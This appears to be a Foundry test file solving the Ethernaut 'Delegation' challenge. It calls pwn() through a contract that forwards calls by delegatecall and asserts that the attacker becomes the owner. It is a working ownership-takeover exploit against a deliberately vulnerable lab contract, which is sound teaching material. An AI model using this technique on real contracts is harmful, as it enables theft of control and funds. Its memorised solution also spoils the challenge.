// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Delegation, Delegate} from "~/Delegation.sol";

contract DelegationTest is Test {
    Delegation target;
    address player;

    function setUp() public {
        Delegate delegate = new Delegate(msg.sender);
        target = new Delegation(address(delegate));
        player = makeAddr("player");
        vm.deal(player, 1 ether);
    }

    function attack() private {
        Delegate(address(target)).pwn();
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertEq(target.owner(), address(player), "owner should be the player");
    }
}
